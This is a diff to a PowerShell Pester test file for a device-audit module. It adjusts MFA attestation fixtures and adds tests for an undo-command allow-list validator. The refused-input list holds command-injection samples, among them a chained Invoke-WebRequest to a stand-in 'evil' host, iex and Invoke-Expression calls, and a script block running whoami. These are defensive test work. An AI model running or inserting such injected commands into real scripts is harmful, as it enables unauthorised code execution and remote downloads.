@@ -634,7 +634,7 @@ Describe 'Audit of a hardened device' {
             try {
                 $cfg.'cloud-services' = [pscustomobject]@{
                     maxAttestationAgeDays = 365
-                    services = @([pscustomobject]@{ name = 'Microsoft 365 / Entra ID'; mfaEnforced = $true; adminMfaEnforced = $true; verifiedOn = (Get-Date).ToString('yyyy-MM-dd'); verifiedBy = 'Paul' })
+                    services = @([pscustomobject]@{ name = 'Microsoft 365 / Entra ID'; mfaEnforced = $true; adminMfaEnforced = $true; verifiedOn = (Get-Date).ToString('yyyy-MM-dd'); verifiedBy = 'IT admin' })
                     detectionHints = $orig.detectionHints
                 }
                 $f = @(Invoke-CEAuditCore -Id 'UA-07')
@@ -651,7 +651,7 @@ Describe 'Audit of a hardened device' {
             try {
                 $cfg.'cloud-services' = [pscustomobject]@{
                     maxAttestationAgeDays = 365
-                    services = @([pscustomobject]@{ name = 'Xero'; mfaEnforced = $false; adminMfaEnforced = $false; verifiedOn = '2026-09-01'; verifiedBy = 'Paul' })
+                    services = @([pscustomobject]@{ name = 'Xero'; mfaEnforced = $false; adminMfaEnforced = $false; verifiedOn = '2026-09-01'; verifiedBy = 'IT admin' })
                     detectionHints = @()
                 }
                 $f = @(Invoke-CEAuditCore -Id 'UA-07')
@@ -2832,6 +2832,37 @@ throw 'boom'
         finally {
             Remove-Item Env:\CE_CHECKER_DATA -ErrorAction SilentlyContinue
             $env:CE_CHECKER_PACKS = $rootA + [IO.Path]::PathSeparator + $rootB
+        }
+    }
+}
+
+Describe 'Undo command safety (Test-CEUndoCommandAllowed)' {
+    It 'allows the commands remediations actually generate' {
+        InModuleScope CEAudit {
+            $ok = @(
+                "Set-NetFirewallProfile -Name 'Domain' -Enabled 'True'",
+                "Enable-NetFirewallRule -Name 'RuleX'",
+                "Enable-LocalUser -SID 'S-1-5-21-1-2-3-1001'",
+                "net.exe user 'bob' /passwordreq:no",
+                "Add-MpPreference -AttackSurfaceReductionRules_Ids 'abc' -AttackSurfaceReductionRules_Actions 'Enabled'",
+                "Set-Service -Name 'W32Time' -StartupType 'Manual'",
+                "wevtutil.exe sl Application /ms:20971520"
+            )
+            foreach ($c in $ok) { Test-CEUndoCommandAllowed $c | Should -BeNullOrEmpty -Because $c }
+        }
+    }
+
+    It 'refuses anything outside the allow-list or with code-execution constructs' {
+        InModuleScope CEAudit {
+            $bad = @(
+                "Invoke-Expression 'calc'",
+                "Start-Process calc.exe",
+                "Set-Service -Name 'x' -StartupType 'Manual'; Invoke-WebRequest 'http://evil/x'",
+                "[System.IO.File]::WriteAllText('a.txt','pwned')",
+                "& { whoami }",
+                "Set-NetFirewallProfile -Name (iex 'evil')"
+            )
+            foreach ($c in $bad) { Test-CEUndoCommandAllowed $c | Should -Not -BeNullOrEmpty -Because $c }
         }
     }
 }
